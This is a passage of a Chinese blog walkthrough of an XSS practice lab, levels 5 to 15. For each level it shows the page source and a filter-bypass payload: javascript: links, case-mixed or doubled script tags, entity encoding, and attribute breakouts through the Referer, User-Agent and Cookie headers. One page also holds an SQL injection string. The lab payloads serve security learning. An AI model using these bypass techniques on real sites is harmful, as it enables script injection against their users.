src=level5.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:26&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li>script过滤了，onclick也过滤了</li></ul><hr><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;/input&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;aaa&lt;/a&gt;//</span><br></pre></td></tr></table></figure><ul><li><p>构造a标签</p></li><li><p>点击aaa</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1></li><li><p>同第二关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level7.php?keyword=move up!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:26&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&gt;&lt;ScRipt&gt;alert(1)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level8.php?keyword=nice try!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:13&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&gt;&lt;ScscriptRipt&gt;alert(1)&lt;/ScscriptRipt&gt;</span><br></pre></td></tr></table></figure><ul><li>删去了script,将script变成scrscriptipt<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level9.php?keyword=not bad!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&lt;scr_ipt&gt;alert(1)&lt;/scr_ipt&gt;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h3 align=center&gt;payload的长度:27&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>上边过滤了<code>&lt;&gt;</code>特殊符号,下边在script中间加了个下划线<br>但是注意看下边代码再<code>href</code>里,这里只是想把href的内容变成<code>javascript:alert(1)</code>，而不涉及标签的修改，所以直接编码绕过<br>在线Unicode编码转换工具 <a href="http://www.jsons.cn/unicode">http://www.jsons.cn/unicode</a></li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level10.php?keyword=well done!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h3 align=center&gt;payload的长度:27&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>双引号和尖括号都给过滤了</li><li>链接不合法，填个合法的<br>在线Unicode编码转换工具 <a href="http://www.jsons.cn/unicode">http://www.jsons.cn/unicode</a></li></ul><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1);http://www.baidu.com    这样不行,javascript:alert(1);要编码</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;//http://www.baidu.com</span><br></pre></td></tr></table></figure><ul><li>点击友情链接<h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level11.php?keyword=good job!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和well done!相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:10&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><ul><li>这里有三个<code>&lt;input&gt;</code>标签的话，也就意味着是三个参数,看看哪一个标签能够被突破</li><li>构造语句：把链接的keyword的值替换<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure></li><li>从页面响应来看，有一个<code>&lt;input&gt;</code>标签的状态可以被改变。这个标签就是名为<code>t_sort</code>的<code>&lt;input&gt;</code>标签，之前都是隐藏状态，但是通过构造参数响应发现只有它里面的值被改变了。因此可以从该标签进行突破，尝试能不能注入恶意代码进行弹窗。</li></ul><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level12.php?keyword=good job!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27; or updatexml(1,concat(0x7e,(database())),1) and &#x27;1&#x27;=&#x27;1&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;input&gt;</code>这次有四个标签</li><li>发现还是t_sort不过双引号和尖括号被过滤,这样浏览器只能正常显示字符但是却无法起到闭合的作用了。</li><li>BP进行抓包可以看到在原始的请求数据包中并没有referer这个请求头，那么我们可以自己给它加上</li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure><ul><li>点击出现的窗口<h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level13.php?keyword=good job!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li>看到了t_ua这样一个标签，并且其中的value属性的值看起来像抓取数据包中User-Agent头的值</li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure><ul><li>在<code>User-Agent</code>的最后面加上payload<h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level14.php&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li>源码中的t_cook标签中出现了。</li><li>尝试在cookie的值中进行构造语句</li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure><ul><li>在<code>cookie</code>的最后面加上payload<h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><h2 id="这题好像有问题"><a href="#这题好像有问题" class="headerlink" title="这题好像有问题"></a>这题好像有问题</h2><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level16.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;&lt;span class=&quot;ng-include:1.gif&quot;&gt;&lt;/span&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;标签的class属性值中，但是前面还有ng-include这样的字符。</span><br><span class="line">ng-include 是  angular js   中的东西，其作用相当于php的include函数。这里就</span><br><span class="line">是将1.gif这个文件给包含进来。</span><br><span class="line"></span><br><span class="line">尖括号被屏蔽</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、ng-include 指令用于包含外部的 HTML文件。</span><br><span class="line">2、包含的内容将作为指定元素的子节点。</span><br><span class="line">3、ng-include 属性的值可以是一个表达式，返回一个文件名。</span><br><span class="line">4、默认情况下，包含的文件需要包含在同一个域名下。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别值得注意的几点如下：</span><br><span class="line">1.ng-include,如果单纯指定地址，必须要加引号</span><br><span class="line">2.ng-include,加载外部html，script标签中的内容不执行</span><br><span class="line">3.ng-include,加载外部html中含有style标签样式可以识别</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">因为这里参数值算是一个地址，所以需要添加引号。但是level1.php不是一个php文件吗？</span><br><span class="line"></span><br><span class="line">这里解释一下</span><br><span class="line">这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。</span><br></pre></td></tr></table></figure><ul><li>src地址无法访问,先将其换成国内可以访问的地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</span><br></pre></td></tr></table></figure></li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 